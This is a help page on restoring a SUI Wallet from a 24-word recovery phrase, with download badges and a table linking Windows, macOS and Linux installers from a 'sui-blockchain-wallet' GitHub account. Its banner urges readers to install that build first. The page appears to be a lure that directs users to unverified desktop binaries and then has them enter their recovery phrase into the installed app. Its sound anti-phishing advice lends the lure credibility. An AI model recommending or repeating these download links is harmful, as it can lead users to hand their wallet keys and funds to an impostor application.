![SUI Wallet](assets/banner-article.png)

# Restoring SUI Wallet from a seed phrase

Enter the words in order; the wallet derives the address rather than looking it up.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Restore takes the 24 words in order, derives the accounts behind them, and shows you the addresses it
found before it reports success. If the funded address is among them the restore worked; if a different,
empty address appears, the words or their order are wrong - and the app now says so instead of claiming
a success you do not have.

## The restore steps

Start the app on the machine that should hold the account, choose Restore on the welcome screen, and type
the 24 words in the order they were written rather than the order you remember them. The form validates as you go, so a word outside the list is
rejected at the moment you type it rather than at the end.

Then read what the app shows before you accept anything: it names the address, or the accounts, that the
words derive. That screen is the restore. Everything after it is confirmation.

## What the app shows before it says success

A restore used to be a leap of faith: you typed 24 words, the app said done, and you found out whether it
was the right account by looking at the balance. The current release removes the leap by showing the
derivation first.

The app derives first and displays second. The address it derived is on screen before any success state,
so the check is a comparison rather than a hope: does this match the address that held the funds? If yes,
the phrase is right. If no, the phrase is not the one that made that account, and no amount of waiting
changes that.

## When the address is not the one expected

Three explanations, in order of likelihood. The words are in the right set but the wrong order - one
transposed pair is enough. A word was written down wrongly and happens to be a valid word, which the form
cannot catch. Or the phrase belongs to a different wallet whose derivation is not this one's.

The first two are fixable with the original copy of the phrase. The third is not a fault in the app: a
phrase from another product does not derive this product's accounts, and the address it produces will be
empty.

[SUI Wallet shows the wrong address after restore](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-shows-the-wrong-address.md) takes the wrong-address case on its own, including what a
second address per account means.

## Phrase order and the checksum

A recovery phrase is not a bag of words; the order carries meaning and the last word carries a checksum.
That is why a phrase can be "all valid words" and still be rejected, and why a phrase that is accepted can
still derive an empty account.

Copy from the original, in order, word by word. Do not sort, do not deduplicate, and do not "fix" a word
that looks odd - the odd one is often correct.

## Restoring on a second machine

The same 24 words restore the same accounts on any machine, which is the point of a phrase-based wallet
and the reason a second copy of the application is not the same thing as a second copy of the account.

[Install the current release](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) on the second machine, choose Restore, and check the derived address before
adding anything to it. Two machines holding the same account is normal; two machines is also two places
from which a signature can be made, so keep the phrase itself out of both of them.

## What a restore never needs

It does not need the old machine, the old installation, a backup of a folder, an email address, a
password reset, or a support agent. If a restore is asking for any of those, it is not this restore but
something imitating it.

That list is worth keeping because the request for help with a failed restore is the most common shape of
a phishing attempt: someone offers to walk you through it and asks for the words. The one thing a restore
needs is the one thing no honest helper needs.

[Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) covers how to make a backup you can rely on
before you need it, and [Importing an existing Sui account](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/importing-an-existing-sui-account.md) covers the case where the account
already exists alongside others.

## FAQ

### Can a lost crypto wallet be recovered?

If you hold the 24 words, yes - that is what they are for. If the words are gone, no: the account exists
on the chain, but nothing in this product or outside it can derive the key again.

### Can I recover my wallet with the password only?

No. A password protects the app on one machine; the phrase controls the account. There is no
password-based path to an account you cannot open.

### What if the restore shows an empty account?

Then the words derived a different account than the one you expected. Check the order against the
original copy, then check that the phrase came from this wallet rather than another one.

### Can I restore into a wallet that already has accounts?

Yes. Restore adds the accounts the phrase derives, and the account selector switches between them. It
does not overwrite what is already there.

### Does restoring change my address?

No. The address is derived from the words, so the same words give the same address on every machine, in
every release.

### Is there any chance of recovering funds if the backup is lost?

Not by derivation. The balance remains on the chain and stays where it is; without the words there is no
key to sign with, and no authority that can issue one.
